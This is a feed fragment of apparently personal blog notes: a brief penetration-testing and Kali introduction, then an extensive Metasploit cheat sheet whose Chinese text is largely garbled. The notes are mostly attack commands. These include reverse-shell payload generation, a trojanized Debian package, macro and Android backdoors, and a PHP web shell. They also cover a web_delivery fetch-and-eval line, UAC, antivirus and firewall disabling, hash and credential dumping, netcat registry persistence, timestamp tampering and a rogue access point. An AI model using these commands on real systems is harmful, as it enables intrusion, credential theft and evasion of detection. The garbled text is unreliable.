        <content type="html"><![CDATA[<h1 id="安全问题的根源"><a href="#安全问题的根源" class="headerlink" title="安全问题的根源"></a>安全问题的根源</h1><ul><li>分层思想的优劣  ==&gt;  每个行业对于整个系统没有完全的认知</li><li>只追求功能实现</li><li>安全问题的根源  ==&gt;  人</li></ul><h1 id="安全目标"><a href="#安全目标" class="headerlink" title="安全目标"></a>安全目标</h1><ul><li>先于攻击者发现和防止漏洞出现<ol><li>攻击型安全</li><li>防护型安全</li></ol></li></ul><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><ul><li>尝试突破安全防御机制</li><li>从攻击者的角度思考，测试安全防护有效性</li><li>证明安全问题的存在，而非破坏</li><li>道德、法律约束</li></ul><h1 id="渗透测试标准"><a href="#渗透测试标准" class="headerlink" title="渗透测试标准"></a>渗透测试标准</h1><ul><li>PETS（<a href="http://www.pentest-standard.org)/">http://www.pentest-standard.org）</a></li><li>前期交互阶段</li><li>情报收集阶段 </li><li>威胁建模阶段  ==&gt;  渗透路径</li><li>漏洞分析阶段</li><li>渗透攻击阶段  ==&gt;  进一步收集、建模、漏洞分析</li><li>后渗透攻击阶段  ==&gt;  扩大战果，进一步渗透攻击</li><li>渗透测试报告  ==&gt;  <strong>非常重要</strong></li></ul><h1 id="渗透测试项目"><a href="#渗透测试项目" class="headerlink" title="渗透测试项目"></a>渗透测试项目</h1><ul><li>测试范围</li><li>是否获得授权</li><li>渗透测试方法  ==&gt;  社会工程学？DDOS？</li></ul><h1 id="渗透测试误区"><a href="#渗透测试误区" class="headerlink" title="渗透测试误区"></a>渗透测试误区</h1><ul><li>过分依赖扫描器  ==&gt;  忽视业务逻辑重的漏洞</li></ul><h1 id="KALI"><a href="#KALI" class="headerlink" title="KALI"></a>KALI</h1><ul><li>基于Debian</li><li>用于渗透测试和安全审计</li><li>前身是BackTrack</li><li>FHS标准目录结构</li><li>定制内核</li></ul><h1 id="KALI-LINUX策略"><a href="#KALI-LINUX策略" class="headerlink" title="KALI LINUX策略"></a>KALI LINUX策略</h1><ul><li>Root 用户策略</li><li>网络服务策略</li><li>更新升级策略</li></ul>]]></content>
      
      
      <categories>
          
          <category> KALI </category>
          
          <category> Introduce </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF</title>
      <link href="2021/03/21/Metasploit-Framework/"/>
      <url>2021/03/21/Metasploit-Framework/</url>
      
        <content type="html"><![CDATA[<h1 id="�ܹ�"><a href="#�ܹ�" class="headerlink" title="�ܹ�"></a>�ܹ�</h1><ul><li><p>Rex</p><ul><li>�������ܿ⣬��������ճ��������������˹��ֶ�����ʵ��</li><li>����socket���ӷ��ʡ�Э��Ӧ��http��SSL��SMB��</li><li>����ת����XOR��Base64��Unicode��</li></ul></li><li><p>Msf::Core</p><ul><li>�ṩMsf�ĺ��Ļ���API����ܵĺ�������ʵ�ֿ�</li></ul></li><li><p>Msf::Base</p><ul><li>�ṩ�Ѻõ�API�ӿڣ�����ģ����õĿ�</li></ul></li><li><p>Plugin���</p><ul><li>���Ӻ͵����ⲿ��չ���ܺ�ϵͳ</li></ul></li></ul><p><strong>Modules</strong></p><ul><li>/usr/share/metasploit-framework/modules</li><li>��������ģ��<ul><li>Exploits������ϵͳ©�����й����Ķ�������ģ���Ӧÿһ������©���Ĺ���������������������</li><li>Payload���ɹ�exploit֮��������Ŀ��ϵͳִ�еĴ����ָ��<ul><li>shellcode �� ϵͳ���shellcode��payload��һ��</li><li>����payload��/usr/share/metasploit-framework/modules/payloads/</li><li><code>Single</code>��all-in-one</li><li><code>Stager</code>��Ŀ�������ڴ�����ʱ���ȴ���һ����С��payload���ڽ�������</li><li><code>Stages</code>������stager�������������صĺ���payload</li></ul></li><li>Auxiliary��ִ����Ϣ�ռ���ö�١�ָ��̽�⡢ɨ��ȹ��ܵĸ���ģ��</li><li>Encoders����payload���м��ܣ����AV����ģ��</li><li>Nops�����payload�ȶ��Լ�ά�ִ�С</li></ul></li></ul><h1 id="����ʹ��"><a href="#����ʹ��" class="headerlink" title="����ʹ��"></a>����ʹ��</h1><ul><li>ʹ��ǰ������msfupdate  /  apt update; apt install metasploit-framework</li><li>Msfcli ʹ�ýӿ�</li><li>Msfconsole ʹ�ýӿ�<ul><li><code>msfconsole -h -q -r -v</code></li><li><code>help / ? / help vulns</code></li></ul></li><li><code>banner��color��connect -h</code></li><li><code>show exploits / options /evasion</code></li><li><code>search ms10-046 / name:mysql platform:aix type:aux cve:2011</code></li><li><code>edit / check / back</code></li></ul><pre><code class="shell">db_status / db_rebuild_cachedb_nmap    hosts / host 1.1.1.1 / hosts -u / hosts -c address,os_flavor -S Linux    services -p 80 / services -c info,name -p 1-1000    vulns / creds / loot (hashdump)db_disconnect / db_connect    /usr/share/metasploit-framework/config/database.ymldb_import / db_export    db_import /root/nmap.xml    db_export -f xml /root/bak.xml</code></pre><pre><code class="shell">set / unset / setg / unsetg / saverun / exploitjobs / kill 0load / unload / loadpathsessions    session -l / -i (sehll��meterpreter��VNC)route  # ͨ��ָ��session·������    route add 192.168.1.15 255.255.255.0 1irb (Framework::Version)  # �����̿����ӿڽ���resource (msfconsol -r a.rc)  # ������Դ�ļ���.rc�ļ�����������</code></pre><h1 id="Exploitg��"><a href="#Exploitg��" class="headerlink" title="Exploitģ��"></a>Exploitģ��</h1><ul><li><strong>Active exploit</strong></li></ul><pre><code class="shell">use exploit/windows/smb/psexecset RHOST 192.168.1.100set PAYLOAD windows/shell/reverse_tcpset LHOST 192.168.1.1set LPORT 4444set SMBUSER user1set SMBPASS pass1exploit</code></pre><ul><li><strong>Passive exploit</strong></li></ul><pre><code class="shell">use exploit/windows/browser/ms07_017_ani_loadimage_chunksizeset URIPATH /set PAYLOAD windows/shell/reverse_tcpset LHOST 192.168.1.1set LPORT 4444exploit</code></pre><p><strong>����payload</strong></p><ul><li><code>use payload/windows/shell_bind_tcp</code></li><li><code>generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&#39;</code>  ָ��bad char���Զ�ѡ�����ģ��</li><li><code>show encoders / generate -e x86/nonalpha</code>  �ֶ�ָ������ģ��</li></ul><pre><code class="shell">generate -b &#39;\x00&#39; -f exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -o /root/1.exe</code></pre><ul><li>NOP��no-operation / Next Operation�����κβ�����<ul><li>EIP���ص��洢NOP sled�������ַʱ�����������յ���shellcodeִ��</li><li><code>generate -s 14</code></li></ul></li></ul><h1 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h1><ul><li>�߼�����̬������չ��payload<ul><li>����meterpreter���������ø���©�����𹥻�</li><li>����͸���Խ׶�һվʽ��������</li></ul></li><li>��ȫ�����ڴ��DLLע��ʽpayload����д���̣�<ul><li>ע��Ϸ�ϵͳ���̲�����stager</li><li>����stager�ϴ���Ԥ����DLL������չģ���ע�루�ͻ���API��</li><li>����stager������socket���ӽ������ܵ�TLS/1.0ͨ������</li><li>����TLS������һ�����غ�����չģ�飨��������ȡ֤��</li></ul></li><li>�����ʹ��C���Ա�д</li><li>�ͻ����ṩ����ruby��ȫ����API��֧���κ����ԣ�</li></ul><pre><code class="shell">help backgroundrun bgruncd ls cat pwd dir mkdir mv rm rmdir editlpwd lcdclearev downloadupload /usr/share/windows-binaries/nc.exe c:\\windows\\system32execute -f cmd.exe -i �CHgetuid getsystem getprivs getproxy getpidhashdump  run post/windows/gather/hashdumpsysinfo ps kill migrate(Ǩ�ƽ���) reboot shutdown shellshow_mount search -f autoexec.batarp netstat ipconfig ifconfig routeidletime(Ŀ�����ʱ��) resourcerecord_mic webcam_list webcam_snap -i 1 -v false</code></pre><p><strong>Meterpreter python��չ</strong></p><ul><li>���軷�����ڿͻ�������ԭ��python����</li></ul><pre><code class="shell">load pythonhelppython_execute &quot;print(&#39;hello&#39;)&quot;python_execute &quot;import os; cd = os.getcwd()&quot; -r cdpython_import -f find.py</code></pre><h1 id="Msfcli"><a href="#Msfcli" class="headerlink" title="Msfcli"></a>Msfcli</h1><pre><code class="shell">msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST 1.1.1.1; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 1.1.1.8; set LPORT 5555; set target 34; exploit&quot;</code></pre><h1 id="MSF-��Ϣ�ռ�"><a href="#MSF-��Ϣ�ռ�" class="headerlink" title="MSF - ��Ϣ�ռ�"></a>MSF - ��Ϣ�ռ�</h1><p><strong>Nmapɨ��</strong></p><pre><code class="shell">db_nmap -sV 192.168.1.0/24</code></pre><p><strong>Auxiliaryɨ��ģ��</strong></p><pre><code class="shell">set RHOSTS file:/root/target.txt# search arpuse auxiliary/scanner/discovery/arp_sweep# search portscanuse auxiliary/scanner/portscan/syn# Nmap IPID idle������ipidseq����use auxiliary/scanner/ip/ipidseq    nmap -Pn -sI 1.1.1.1 1.1.1.2# UDP ɨ��use auxiliary/scanner/discovery/udp_sweepuse auxiliary/scanner/discovery/udp_probe</code></pre><p><strong>������̽</strong></p><pre><code class="shell">use auxiliary/sniffer/psnuffle# ֧�ִ�pcapץ���ļ�����ȡ����# ����������dnsiff# Ŀǰֻ֧��pop3��imap��ftp��HTTP GETЭ��</code></pre><p><strong>SNMPЭ��</strong></p><pre><code class="shell">vi /etc/default/snmpd  # snmp�����ļ�use auxiliary/scanner/snmp/snmp_loginuse auxiliary/scanner/snmp/snmp_enumuse auxiliary/scanner/snmp/snmp_enumusers (windows)use auxiliary/scanner/snmp/snmp_enumshares (windows)</code></pre><p><strong>SMB����</strong></p><pre><code class="shell"># SMB�汾ɨ��use auxiliary/scanner/smb/smb_version# ɨ�������ܵ����ж�SMB�������ͣ��˺š����룩use auxiliary/scanner/smb/pipe_auditor# ɨ��ͨ��SMB�ܵ����Է��ʵ�RCERPC����use auxiliary/scanner/smb/pipe_dcerpc_auditor# SMB����ö�٣��˺š����룩use auxiliary/scanner/smb/smb_enumshares# SMB�û�ö�٣��˺š����룩use auxiliary/scanner/smb/smb_enumusers# SIDö�٣��˺š����룩use auxiliary/scanner/smb/smb_lookupsid</code></pre><p><strong>SSHɨ��</strong></p><pre><code class="shell"># SSH�汾��Ϣuse auxiliary/scanner/ssh/ssh_version# SSH���뱬��use auxiliary/scanner/ssh/ssh_login    set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt# SSH��Կ��¼use auxiliary/scanner/ssh/ssh_login_pubkey    set KEY_FILE id_rsa</code></pre><p><strong>ϵͳ����ɨ��</strong></p><pre><code class="shell"># ���windows�Ѿ���װ�Ĳ���use post/windows/gather/enum_patches# ʧ�ܿ��Գ���Ǩ�ƽ���</code></pre><p><strong>Mssql</strong></p><pre><code class="shell"># Mssqlɨ��˿�# TCP 1433����̬�˿ڣ� / UDP 1434 ��ѯTCP�˿ں�use auxiliary/scanner/mssql/mssql_ping# ��������use auxiliary/scanner/mssql/mssql_login# Զ��ִ������use auxiliary/admin/mssql/mssql_exec</code></pre><p><strong>FTP</strong></p><pre><code class="shell"># FTP�汾ɨ��use auxiliary/scanner/ftp/ftp_versionuse auxiliary/scanner/ftp/anonymoususe auxiliary/scanner/ftp/ftp_login</code></pre><h1 id="MSF-����i��"><a href="#MSF-����i��" class="headerlink" title="MSF ����ɨ��"></a>MSF ����ɨ��</h1><ul><li>������Ϣ�ռ��������©������ģ��</li><li>����ⲿ©��ɨ��ϵͳ�Դ�IP��ַ�ν�������ɨ��</li></ul><pre><code class="shell"># VNC�����ƽ�use auxiliary/scanner/vnc/vnc_login# VNC���������use auxiliary/scanner/vnc/vnc_none_auth    supported��None or VNC# VNCԶ������©��    # ��鲻�����DoS����use auxiliary/scanner/rdp/ms12_020_check# �豸����use auxiliary/scanner/ssh/juniper_backdooruse auxiliary/scanner/ssh/fortinet_backdoor# VMWare ESXi ���뱬��use auxiliary/scanner/vmware/vmauthd_loginuse auxiliary/scanner/vmware/vmware_enum_vms# ����WEB APIԶ�̿��������use auxiliary/admin/vmware/poweron_vm</code></pre><p><strong>HTTP����ɨ��</strong></p><pre><code class="shell"># ɨ�����֤��use auxiliary/scanner/http/cert# ��ʾĿ¼���ļ�use auxiliary/scanner/http/dir_listinguse auxiliary/scanner/http/files_dir# WebDAV Unicode �����ƹ�use auxiliary/scanner/http/dir_webdav_unicode_bypass# Tomacat ������¼ҳ��use auxiliary/scanner/http/tomcat_mgr_login# ����HTTP������������֤�ƹ�use auxiliary/scanner/http/verb_auth_bypass# WordPress���뱬��use auxiliary/scanner/http/wordpress_login_enum    set TARGETURI /wordpress/wp-login.php</code></pre><p><strong>WMAP WEBӦ��ɨ����</strong></p><ul><li>����SQLMAP�Ĺ�����ʽ����</li></ul><pre><code>load wmapwmap_sites -a http://1.1.1.1wmap_targets -t http://1.1.1.1/mutillidae/index.phpwmap_run -twmap_run -ewmap_vulns -lvulns</code></pre><p><strong>Openvas</strong></p><pre><code class="shell"># Install openvasapt-get install openvas openvas-scannergvm-setupgvm-check-setupgvm-startgvm-feed-updategvmd --user=admin --new-password=admin# ����openvasload openvas  # ����nbe��ʽɨ����־db_import openvas.nbe# nessusLoad nessusnessus_helpnessus_connect admin:toor@1.1.1.1nessus_policy_listnessus_scan_newnessus_report_list</code></pre><h1 id="�ͻ�����͸"><a href="#�ͻ�����͸" class="headerlink" title="�ͻ�����͸"></a>�ͻ�����͸</h1><ul><li>����payload����ƭ�ͻ���ִ�У�Linux Deb��װ����</li></ul><pre><code>apt-get --download-only install freeweepdpkg -x freesweep_0.90-1_i386.deb freemkdir free/DEBIAN &amp;&amp; cd free/DEBIANvi controlvi postinst    #!/bin/sh    sudo chmod 755 /usr/games/freesweep_scores &amp;&amp; /usr/games/freesweep_scores &amp; /usr/games/freesweep &amp;msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcpLHOST=1.1.1.1 LPORT=4444 -b &quot;\x00&quot; -f elf -o /root/free/usr/games/freesweep_scoreschmod 755 postinstdpkg-deb --build /root/free</code></pre><p><strong>����Acrobat Reader©��ִ��</strong></p><pre><code class="shell"># ����PDF�ļ���exploit/windows/fileformat/adobe_utilprintf    # (Windows XP)# ���������վ��exploit/windows/browser/adobe_utilprintf# Meterpreter��use priv; run post/windows/capture/keylog_recorder</code></pre><p><strong>����Flash���©��ִ��payload</strong></p><pre><code class="shell">use exploit/multi/browser/adobe_flash_hacking_team_uafuse exploit/multi/browser/adobe_flash_opaque_background_uafuse auxiliary/server/browser_autopwn2</code></pre><p><strong>����IE�����©��ִ��payload</strong></p><pre><code class="shell">use exploit/windows/browser/ms14_064_ole_code_execution</code></pre><p><strong>����JRE©��ִ��payload</strong></p><pre><code class="shell">use exploit/multi/browser/java_jre17_driver_manageruse exploit/multi/browser/java_jre17_jmxbeanuse exploit/multi/browser/java_jre17_reflection_types</code></pre><p><strong>����Android���ų���</strong></p><pre><code class="shell">use payload/android/meterpreter/reverse_tcpgenerate -f a.apk -p android -t raw</code></pre><p><strong>VBScript��Ⱦ��ʽ</strong></p><ul><li>���ú� ��Ⱦword��excel�ĵ�</li><li>�ƹ�ĳЩ�����ļ����ͼ��İ�ȫ����</li></ul><pre><code class="shell"># ����vbscript�ű�msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -e x86/shikata_ga_nai -f vba-exe# Office 2007 # ��ͼ -- �� -- ����# Payload ��һ����VBA����# Payload �ڶ�����ճ��word�ĵ�����# Msf��������use exploit/multi/handlerset payload windows/meterpreter/reverse_tcp</code></pre><h1 id="MSF����͸�׶�"><a href="#MSF����͸�׶�" class="headerlink" title="MSF����͸�׶�"></a>MSF����͸�׶�</h1><ul><li>�Ѿ����Ŀ��ϵͳ����Ȩ������ս��<ul><li>��Ȩ</li><li>��Ϣ�ռ�</li><li>��͸����</li><li>���ú���</li></ul></li><li>��������session����ս��</li></ul><pre><code class="shell">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o 1.exe</code></pre><p><strong>��ȡsystem�˺�����</strong></p><pre><code class="shell">load privgetsystem    priv_elevate_getsystem: Operation failed: Access is denied.</code></pre><p><strong>�ƹ�UAC����</strong></p><pre><code class="shell">use exploit/windows/local/ask    set payload windows/meterpreter/reverse_tcp    set session    set filenameuse exploit/windows/local/bypassuacuse exploit/windows/local/bypassuac_injection    set session    set payload</code></pre><p><strong>����©��ֱ����ȨΪsystem</strong></p><pre><code class="shell">use exploit/windows/local/ms13_053_schlampereiuse exploit/windows/local/ms13_081_track_popup_menuuse exploit/windows/local/ms13_097_ie_registry_symlinkuse exploit/windows/local/ppr_flatten_rec</code></pre><p><strong>ͼ�λ�payload</strong></p><pre><code class="shell">set payload windows/vncinject/reverse_tcpset viewonly no  # �ɲ���</code></pre><p><strong>Psexecģ��֮Passthehash</strong></p><pre><code class="shell">use exploit/windows/smb/psexec    set smbpass hash# ��ǰ�ر�UACcmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /fcmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></pre><p><strong>�رշ���ǽ</strong></p><pre><code class="shell"># ��Ҫ����Ա��systemȨ��netsh advfirewall set allprofiles state on</code></pre><p><strong>�ر�Windefend</strong></p><pre><code class="shell">net stop windefend</code></pre><p><strong>Bitlocker���̼���</strong></p><pre><code class="shell">manage-bde -off C:manage-bde -status C:</code></pre><p><strong>�ر�DEP</strong></p><pre><code class="shell">bcdedit.exe /set &#123;current&#125; nx AlwaysOff</code></pre><p><strong>ɱ������������</strong></p><pre><code>run killavrun post/windows/manage/killav</code></pre><p><strong>����Զ���������</strong></p><pre><code class="shell">run post/windows/manage/enable_rdprun getgui �Ce    run getgui -u yuanfh -p pass    run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20160824.1855.rc</code></pre><p><strong>�鿴Զ������</strong></p><pre><code class="shell">screenshotuse espia    screengrab</code></pre><p><strong>Tokens</strong></p><ul><li>�û�ÿ�η��ʣ��˺Ű���ʱ��Token</li><li>������Դʱ�ύToken����������֤��������WEB Cookie</li><li>Delegate Token��������¼�Ự</li><li>Impersonate Token���ǽ�����¼�Ự</li><li>Delegate Token�˺�ע�����ΪImpersonate Token��Ȩ����Ȼ��Ч</li></ul><p>Incognito</p><ul><li>�������ܵ���������MSF������meterpreter��</li><li>���������ƽ���ȡ����HASH����ȡToken���Լ�αװ�������û�</li><li>�����������򻷾�����Ȩ��͸�����ϵͳ</li></ul><pre><code class="shell">load incognitolist_tokens -uimpersonate_token lab\\administrator# ��������������Ҫgetsystem    use exploit/windows/local/ms10_015_kitrap0d    execute -f cmd.exe -i -t  # -t ʹ�õ�ǰ��ð��tokenִ�г���    shell</code></pre><p><strong>ע���</strong></p><ul><li>ע���������windows����ȫ�����ò�����ĳЩע������޸Ĳ�����</li><li>�޸ġ�����������</li><li>��ȡ�洢��ע����еĻ�����Ϣ</li><li>�ƹ��ļ��Ͳ�����ɱ</li></ul><pre><code class="shell"># ��ע�������NC���ŷ���meterpreter��upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\runreg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#39;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#39;reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</code></pre><pre><code class="shell"># �򿪷���ǽ�˿ڣ�meterpreter��execute -f cmd -i -Hnetsh firewall show opmodenetsh firewall add portopening TCP 4444 &quot;test&quot; ENABLE ALLshutdown -r -t 0nc 1.1.1.1 4444</code></pre><ul><li><p>����ע�����</p><p><a href="https://support.accessdata.com/hc/en-us/articles/204448155-Registry-Quick-Find-Chart">https://support.accessdata.com/hc/en-us/articles/204448155-Registry-Quick-Find-Chart</a></p></li></ul><p><strong>ץ����meterpreter��</strong></p><pre><code class="shell">load sniffersniffer_interfacessniffer_start 1sniffer_dump 1 1.cap# ���ڴ��л�������洢ץ����50000��������д��Ӳ��# ���ܹ���meterpreter���������������ʹ��SSL/TLS����# ����use auxiliary/sniffer/psnuffleset PCAPFILE 1.cap</code></pre><p><strong>�����ļ�</strong></p><pre><code class="shell">search -f *.inisearch -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.docx</code></pre><p><strong>�����ƽ�</strong></p><p>John the Ripper �ƽ�������</p><pre><code class="shell">use post/windows/gather/hashdump # systemȨ�޵�meterpreterrun # ���������/tmpĿ¼��use auxiliary/analyze/jtr_crack_fastrun</code></pre><p><strong>�����ۼ�</strong></p><ul><li>�ļ�ϵͳ���ʻ����ºۼ�������ȡ֤�ص��ע</li><li>��͸���Ժ͹���������ϣ�������ļ�ϵͳ���ʺۼ�</li><li>��õı��ⱻ����ȡ֤���ֵķ�������Ҫ���ļ�ϵͳ��Meterpreter�����ڴ棩</li><li>MACʱ�䣨Modified / Accessed / Changed��</li></ul><pre><code>ls -l --time=atime/mtime/ctime 1.txtstat 1.txttouch -d &quot;2 days ago&quot; 1.txttouch -t 1501010101 1.txt</code></pre><pre><code class="shell"># MACE: MFT entry# MFT: NTFS�ļ�ϵͳ����ϵͳ�����ļ������Master File Table# ͨ��1023�ֽڻ�2��Ӳ�����������д�Ŷ���wntry��Ϣ# �����ļ�������Ϣ����С�����ơ�Ŀ¼λ�á�����λ�á��������ڣ�# Timestomp (meterpreter)timestomp -v 1.txttimestomp -f c:\\autoexec.bat 1.txt-b -r # ����MACʱ����Ϣ-m / -a / -c / -e / -ztimestomp -z &quot;MM/DD/YYYY HH24:MI:SS&quot; 2.txt</code></pre><p><strong>·��</strong></p><ul><li>Pivoting ���� / ��Ŧ / ֧��<ul><li>�����Ѿ����Ƶ�һ̨�������Ϊ���������� ����</li><li>�����������������������ȫ�������� �����</li><li><code>run autoroute -s 1.1.1.0/24</code> # ���ܷ��������ı�����Ŀ����������</li></ul></li><li>�Զ�·�� ��ʵ����<ul><li>����win7��������XP</li><li>ɨ��������<code>use auxiliary/scanner/portscan/tcp</code></li></ul></li><li>Pivoting ֮�˿�ת�� Portfwd</li></ul><pre><code class="shell"># �����Ѿ������Ƶļ��������kali�빥��Ŀ��֮��ʵ�ֶ˿�ת��portfwd add -L LIP -l LPORT -r RIP -p RPORTportfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389portfwd list / delete / flushuse exploit/windows/smb/ms08_067_netapi    set RHOST 127.0.0.1    set LHOST 2.1.1.10    use exploit/multi/handler    set exitonsession false</code></pre><p><strong>POSTģ��</strong></p><pre><code class="shell">run post/windows/gather/arp_scanner RHOSTS=2.1.1.0/24run post/windows/gather/checkvmrun post/windows/gather/credentials/credential_collectorrun post/windows/gather/enum_applicationsrun post/windows/gather/enum_logged_on_usersrun post/windows/gather/enum_snmprun post/multi/recon/local_exploit_suggesterrun post/windows/manage/delete_user USERNAME=yuanfhrun post/multi/gather/envrun post/multi/gather/firefox_credsrun post/multi/gather/ssh_credsrun post/multi/gather/check_malware REMOTEFILE=c:\\a.exe</code></pre><p><strong>�Զ�ִ�нű�</strong></p><pre><code class="shell">use exploit/multi/handlershow advancedset AutoRunScript hostsedit -e 1.1.1.1,www.baidu.comset InitialAutoRunScript checkvm# �Զ�ִ�� post ģ��set InitialAutoRunScript migrate -N explorer.exeset AutoRunScript post/windows/gather/dumplinks</code></pre><p><strong>�־ú���</strong></p><ul><li>����©��ȡ�õ�meterpreter shell�������ڴ��У�����ʧЧ</li><li>�ظ�exploit©��������ɷ������</li><li>�־ú��ű�֤©���޸����Կ���Զ�̿���</li></ul><pre><code class="shell"># Meterpreter ����run metsvc -A   # ɾ�� -ruse exploit/multi/handlerset PAYLOAD windows/metsvc_bind_tcpset LPORT 31337set RHOST 1.1.1.1</code></pre><pre><code>run persistence -hrun persistence -X -i 10 -p 4444 -r 1.1.1.1run persistence -U -i 20 -p 4444 -r 1.1.1.1run persistence -S -i 20 -p 4444 -r 1.1.1.1</code></pre><p><strong>MSF��չ�÷�-Mimikatz</strong></p><pre><code class="shell"># hashdump ʹ�ò���mimikatz����getsystemload mimikatzkiwi_cmd</code></pre><p><strong>PHP Shell</strong></p><pre><code class="shell">msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=3333 -f raw -o a.php# �ϴ�webվ�㣬��ִ��</code></pre><p><strong>Web Delivery</strong></p><pre><code class="shell"># ���ô���ִ��©�����ʹ����߷�����use exploit/multi/script/web_deliveryset target 1php -d allow_url_fopen=true -r ��eval(file_get_contents(��http://1.1.1.1/fTYWqmu&#39;));&quot;</code></pre><p><strong>RFIԶ���ļ�����</strong></p><pre><code class="shell">vi /etc/php5/cgi/php.ini   # php �����ļ�    allow_url_fopen = On    allow_url_include = Onuse exploit/unix/webapp/php_include    set RHOST 1.1.1.2    set PATH /dvwa/vulnerabilities/fi/    set PHPURI /?page=XXpathXX    set HEADERS &quot;Cookie:security=low;PHPSESSID=eefcf023ba61219d4745ad7487fe81d7&quot;    set payload php/meterpreter/reverse_tcp    set lhost 1.1.1.1    exploit</code></pre><p><strong>����</strong></p><p>Karmetasploit</p><pre><code class="shell"># α��AP����̽���롢�ӻ����ݡ����������wget https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt# ��װ����������gem install activerecord sqlite3-ruby# �����ܹ���װ����apt-get install isc-dhcp-servercat /etc/dhcp/dhcpd.confoption domain-name-servers 10.0.0.1;default-lease-time 60;max-lease-time 72;ddns-update-style none;authoritative;log-facility local7;subnet 10.0.0.0 netmask 255.255.255.0 &#123;range 10.0.0.100 10.0.0.254;option routers 10.0.0.1;option domain-name-servers 10.0.0.1;&#125;    # α��APairmon-ng start wlan0airbase-ng -P -C 30 -e &quot;FREE&quot; -v wlan0monifconfig at0 up 10.0.0.1 netmask 255.255.255.0touch /var/lib/dhcp/dhcpd.leasesdhcpd -cf /etc/dhcp/dhcpd.conf at0# ����Karmetasploitmsfconsole -q -r karma.rc_.txt# �޸�karma.rc_.txt�������û���������vi karma.rc_.txt# ɾ��setg����# ����browser_autopwn2��ģ��# ������������auxiliary/vsploit/malware/dns*# ����Karmetasploitmsfconsole -q -r karma.rc_.txt# ����·�ɺͷ���ǽ����echo 1 &gt; /proc/sys/net/ipv4/ip_forwardiptables -P FORWARD ACCEPTiptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</code></pre><h1 id="Armitage-ͼ�λ�j��"><a href="#Armitage-ͼ�λ�j��" class="headerlink" title="Armitage ͼ�λ�ǰ��"></a>Armitage ͼ�λ�ǰ��</h1><ul><li>��Դ���ͼ��ǰ��</li><li>Armitageֻ�ǵ���MSF��©����������</li><li>����ŶӺ���ģ��Կ�<ul><li>�ͻ��ˣ�armitage���� ��������msfrpcd��������</li><li>/usr/share/armitage/teamserver ip password</li></ul></li><li>�ɽű���</li></ul><p><strong>������ʽ</strong></p><pre><code class="shell">systemctl start postgresql# Teamserver# ��������teamserver ����IP ��������# �ͻ��ˣ�armitage# ��������# armitage# GUI����# 127.0.0.1:55553</code></pre><p><strong>��������</strong></p><ul><li>�ֶ�����IP��ַ</li><li>ɨ�������루nmap�� nessus�� openvas�� appscan�� nexpose�� awvs��</li><li>ֱ��ɨ�跢�֣�nmap��msf��</li><li>DNSö��</li></ul><p><strong>ɨ��˿ڼ�����</strong></p><p><strong>������ workspace</strong></p><p><strong>��ȡĿ��</strong></p><ul><li>browser_autopwn2</li></ul><p><strong>Cortana �ű�</strong></p><ul><li>Veil-Evasion��/use/share/veil-evasion/tools/cortana/veil_evasion.cna</li><li><a href="https://github.com/rsmudge/cortana-scripts">https://github.com/rsmudge/cortana-scripts</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> KALI </category>
          
          <category> AAA </category>
          
          <category> Linux </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> metasploit-framework </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
